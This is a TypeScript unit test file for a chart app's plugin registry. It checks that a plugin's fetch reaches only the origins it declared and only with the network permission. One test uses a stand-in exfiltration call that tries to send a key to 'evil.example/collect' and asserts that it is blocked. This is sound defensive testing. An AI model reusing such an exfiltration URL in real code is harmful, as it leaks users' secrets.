import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { PluginRegistry } from './PluginRegistry';
import type { ChartPlugin, PluginContext } from './PluginRegistry';

// Only the members buildRestrictedContext touches. It spreads the context it is
// given, so everything else passing through untouched is the point.
function fakeContext(onFetch: (url: string) => void): PluginContext {
    return {
        dataLevel: 'ohlcv',
        fetch: async (url: string) => {
            onFetch(url);
            return new Response('{}');
        },
    } as unknown as PluginContext;
}

async function install(
    plugin: Partial<ChartPlugin>,
    onFetch: (url: string) => void = () => {},
): Promise<PluginContext> {
    const registry = new PluginRegistry();
    registry.notifyRenderEngineReady(null as never);

    let restricted: PluginContext | null = null;
    await registry.register(
        {
            id: 'test',
            name: 'Test',
            version: '1.0.0',
            type: 'extension',
            code: '',
            install: (ctx) => {
                restricted = ctx;
            },
            ...plugin,
        } as ChartPlugin,
        fakeContext(onFetch),
    );

    assert.ok(restricted, 'the plugin should have been installed');
    return restricted;
}

describe('plugin fetch', () => {
    it('reaches an origin the plugin declared', async () => {
        const seen: string[] = [];
        const ctx = await install(
            { permissions: ['network'], origins: ['https://api.massive.com'] },
            (url) => seen.push(url),
        );

        await ctx.fetch('https://api.massive.com/v2/aggs?apiKey=secret');
        assert.deepEqual(seen, ['https://api.massive.com/v2/aggs?apiKey=secret']);
    });

    it('refuses an origin it did not, which is the whole point of the key staying put', async () => {
        let called = false;
        const ctx = await install(
            { permissions: ['network'], origins: ['https://api.massive.com'] },
            () => {
                called = true;
            },
        );

        await assert.rejects(
            () => ctx.fetch('https://evil.example/collect?key=secret'),
            /not allowed/,
        );
        assert.equal(called, false);
    });

    it('ignores the path and query when matching, only the origin counts', async () => {
        const ctx = await install({
            permissions: ['network'],
            origins: ['https://api.massive.com/v2/ignored'],
        });
        await ctx.fetch('https://api.massive.com/anything/else');
    });

    it('treats a different port or scheme as a different origin', async () => {
        const ctx = await install({
            permissions: ['network'],
            origins: ['https://api.example.com'],
        });
        await assert.rejects(() => ctx.fetch('http://api.example.com/x'), /not allowed/);
        await assert.rejects(() => ctx.fetch('https://api.example.com:8443/x'), /not allowed/);
    });

    it('lets nothing through when a plugin declared no origins at all', async () => {
        const ctx = await install({ permissions: ['network'] });
        await assert.rejects(() => ctx.fetch('https://api.massive.com/x'), /not allowed/);
    });

    it('still needs the network permission, origins alone are not enough', async () => {
        const ctx = await install({ origins: ['https://api.massive.com'] });
        await assert.rejects(() => ctx.fetch('https://api.massive.com/x'), /Missing network/);
    });

    it('rejects a url it cannot even parse', async () => {
        const ctx = await install({
            permissions: ['network'],
            origins: ['https://api.massive.com'],
        });
        await assert.rejects(() => ctx.fetch('not a url'), /bad url/);
    });

    it('skips an origin entry that is not a url instead of throwing on it', async () => {
        const ctx = await install({
            permissions: ['network'],
            origins: ['nonsense', 'https://api.massive.com'],
        });
        await ctx.fetch('https://api.massive.com/x');
    });
});
